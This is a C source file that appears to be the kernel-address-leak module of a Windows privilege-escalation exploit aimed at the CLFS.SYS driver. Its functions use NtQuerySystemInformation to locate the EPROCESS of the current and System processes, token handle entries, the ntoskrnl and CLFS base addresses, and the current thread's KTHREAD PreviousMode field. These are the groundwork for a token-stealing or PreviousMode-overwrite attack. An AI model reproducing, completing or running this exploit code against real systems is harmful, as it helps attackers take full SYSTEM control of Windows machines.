#include "leak.h"

_NtQuerySystemInformation fnNtQuerySystemInformation = NULL;
DWORD64 g_EProcessAddress = 0;
DWORD64 g_EThreadAddress = 0;
DWORD64 g_TokenAddress = 0;
DWORD64 my_pidEprocess = 0;
HANDLE hProcess = NULL;
DWORDLONG system_EPROCESS = 0;
HANDLE hThread = NULL;
HANDLE hToken = NULL;
HMODULE user32 = NULL;
UINT64 ntos_kernelBase=NULL;
UINT64 clfs_kernelBase=NULL;
ULONG64 kthreadAddr = 0;
SIZE_T GetKernelObjectAddress(HANDLE Object) {
	PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
	ULONG handleInfoSize = 0x1000;
	ULONG retLength;
	NTSTATUS status;
	SIZE_T kernelAddress = 0;
	BOOL bFind = FALSE;

	while (true) {
		handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);
		status = fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);
		if (status == STATUS_INFO_LENGTH_MISMATCH) {
			LocalFree(handleInfo);
			handleInfoSize = retLength + 0x100;
			handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);
			status = fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);
		}
		else if (NT_SUCCESS(status)) {
			for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
				if ((ULONG)Object == 0x4) {
					if (0x4 == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)handleInfo->Handles[i].HandleValue) {
						kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
						bFind = TRUE;
						break;
					}
				}
				else {
					if (GetCurrentProcessId() == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)Object == (SIZE_T)handleInfo->Handles[i].HandleValue) {
						kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
						bFind = TRUE;
						break;
					}
				}
			}
		}
		if (handleInfo) {
			LocalFree(handleInfo);
		}
		if (bFind)
			break;
	}
	return kernelAddress;
}

VOID InitEnvironment() {  
   HMODULE hNtdll = LoadLibraryA("ntdll.dll");  
   if (!hNtdll) {  
       printf("[-] Failed to load ntdll.dll.\n");  
       exit(EXIT_FAILURE);  
   }  

   fnNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");  
   if (!fnNtQuerySystemInformation) {  
       printf("[-] Failed to get NtQuerySystemInformation function address.\n");  
       exit(EXIT_FAILURE);  
   }  

   DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), &hProcess, 0, FALSE, DUPLICATE_SAME_ACCESS);
   printf("[+] HPROCESS: %p\n", hProcess);
   g_EProcessAddress = GetKernelObjectAddress(hProcess);
   if (g_EProcessAddress == 0) {
	   printf("[-] Failed to get EPROCESS address.\n");
	   exit(EXIT_FAILURE);
   }
   printf("[+] My EPROCESS Address: %p\n", g_EProcessAddress);
   system_EPROCESS = GetKernelObjectAddress((HANDLE)4);
   if (system_EPROCESS == 0) {
	   printf("[-] Failed to get system EPROCESS address.\n");
	   exit(EXIT_FAILURE);
   }
   printf("[+] System EPROCESS Address: %p\n", system_EPROCESS);
}

int CheckAccessToken() {
	DWORD currentPid = GetCurrentProcessId();
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, currentPid );
	printf("[+] hProcess: 0x%x\n", hProcess);
	int savedHprocess = 0;
	savedHprocess = (UINT)hProcess;
	if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hProcess)) {
		printf("[!] OpenProcessToken failed with error %d\n", GetLastError());
		return 0;
	}
	PHANDLE TokenHandle = NULL;
	TokenHandle = &hProcess;
	printf("[+] Token handle: 0x%x\n", TokenHandle);

	void* handleInfoBuffer = malloc(0x20);
	if (!handleInfoBuffer) exit(1);
	ULONG handleInfoSize = 0;
	NTSTATUS status = fnNtQuerySystemInformation(SystemHandleInformation, handleInfoBuffer, 0x20, &handleInfoSize);
	if (status != 0xC0000004 && !NT_SUCCESS(status)) {
		printf("[-] Initial query failed.\n");
		free(handleInfoBuffer);
		return 0;
	}

	free(handleInfoBuffer);
	handleInfoBuffer = malloc(handleInfoSize);
	if (!handleInfoBuffer) exit(1);
	status = fnNtQuerySystemInformation(SystemHandleInformation, handleInfoBuffer, handleInfoSize, &handleInfoSize);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to retrieve system handle info.\n");
		free(handleInfoBuffer);
		return 0;
	}
	printf("[+] Structure Address: %p\n", handleInfoBuffer);
	ULONG handleCount = *(ULONG*)handleInfoBuffer;
	printf("[+] Number of Handles: 0x%x\n", handleCount);

	SYSTEM_HANDLE_TABLE_ENTRY_INFO* entry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO*)((PUINT)handleInfoBuffer + 2);

	for (UINT64 index = 0; index < handleCount; ++index, ++entry) {
		if (entry->UniqueProcessId != currentPid) continue;
		if (entry->ObjectTypeIndex != 0x5) continue; // Token
		if ((USHORT)(uintptr_t)hToken != entry->HandleValue) continue;

		printf("[+] Found Token Handle Entry:\n");
		printf("    -> PID: %u\n", entry->UniqueProcessId);
		printf("    -> Handle: 0x%x\n", entry->HandleValue);
		printf("    -> Object Type: %u (Token)\n", entry->ObjectTypeIndex);
		break;
	}
	return 0;
}

VOID FindKernelModulesBase()
{
	CHAR clfs_path[] = { "\\SystemRoot\\System32\\drivers\\CLFS.SYS" };
	UINT64 retval = 0;
	HANDLE hHeap = GetProcessHeap();
	LPVOID lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);
	DWORD dwBytesReturned = 0;

	if (!lpHeapBuffer) {
		return;
	}

	NTSTATUS status = fnNtQuerySystemInformation(
		(SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
		lpHeapBuffer,
		0x2000,
		&dwBytesReturned
	);

	if (!NT_SUCCESS(status)) {
		HeapFree(hHeap, 0, lpHeapBuffer);
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);

		if (!lpHeapBuffer) {
			return;
		}

		memset(lpHeapBuffer, 0, dwBytesReturned);

		status = fnNtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);

		if (!NT_SUCCESS(status)) {
			return;
		}
	}

	PSYSTEM_MODULE_INFORMATION psm = (PSYSTEM_MODULE_INFORMATION)lpHeapBuffer;
	if (psm->NumberOfModules > 0) {
		retval = (UINT64)psm->Modules[0].ImageBase;
		//HeapFree(hHeap, 0, lpHeapBuffer);
		ntos_kernelBase = retval;

	}

	int i = 0;
	for (i = 0; i < psm->NumberOfModules; i++)
	{
		if (!strncmp(clfs_path, (CHAR*)psm->Modules[i].FullPathName, strlen(clfs_path)))  break;
	}
	printf("[+] Module name --> %s\n", psm->Modules[i].FullPathName);

	clfs_kernelBase = (UINT64)psm->Modules[i].ImageBase;
	return;
}


VOID FindPreviousModeAddress() {
	if (!fnNtQuerySystemInformation) {
		printf("NtQuerySystemInformation not found\n");
		return;
	}

	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
	if (!hThread) {
		printf("OpenThread failed\n");
		return;
	}

	DWORD pid = GetCurrentProcessId();
	ULONG len = 0x10000;
	PSYSTEM_HANDLE_INFORMATION pInfo = NULL;
	NTSTATUS status;

	do {
		if (pInfo) HeapFree(GetProcessHeap(), 0, pInfo);
		pInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len);
		status = fnNtQuerySystemInformation(SystemHandleInformation, pInfo, len, &len);
		if (status == 0xC0000004) len *= 2;
	} while (status == 0xC0000004);

	if (status < 0) {
		printf("NtQuerySystemInformation failed: 0x%X\n", status);
		HeapFree(GetProcessHeap(), 0, pInfo);
		return;
	}

	USHORT targetHandle = (USHORT)(ULONG_PTR)hThread;

	for (ULONG i = 0; i < pInfo->NumberOfHandles; i++) {
		SYSTEM_HANDLE_TABLE_ENTRY_INFO entry = pInfo->Handles[i];
		if (entry.UniqueProcessId == pid && entry.HandleValue == targetHandle) {
			kthreadAddr = (ULONG64)entry.Object;
			break;
		}
	}

	HeapFree(GetProcessHeap(), 0, pInfo);
	CloseHandle(hThread);

	if (!kthreadAddr) {
		printf("KTHREAD not found\n");
		return;
	}

	printf("[+] KTHREAD = 0x%llx\n", kthreadAddr);
	printf("[+] PreviousMode address = 0x%llx\n", kthreadAddr + KTHREAD_PREVIOUS_MODE_OFFSET);
}